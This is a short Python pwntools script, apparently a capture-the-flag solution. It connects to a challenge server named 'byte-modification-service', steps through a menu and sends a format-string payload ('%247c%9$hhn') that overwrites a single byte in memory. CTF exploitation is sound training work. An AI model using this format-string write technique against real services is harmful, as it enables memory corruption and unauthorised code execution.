from pwn import *

#p = process("./chall")
p = remote("byte-modification-service.challs.csc.tf", 1337)

sleep(1)

fmt = b"%247c%9$hhn"
fmt += b"A" * (19 - len(fmt))
print(p.recv())
p.sendline(b"11")
sleep(1)
print(p.recv())
p.sendline(b"0")
sleep(1)
print(p.recv())
p.sendline(b"69")
sleep(1)
print(p.recv())
p.sendline(fmt)
sleep(1)
print(p.recv())
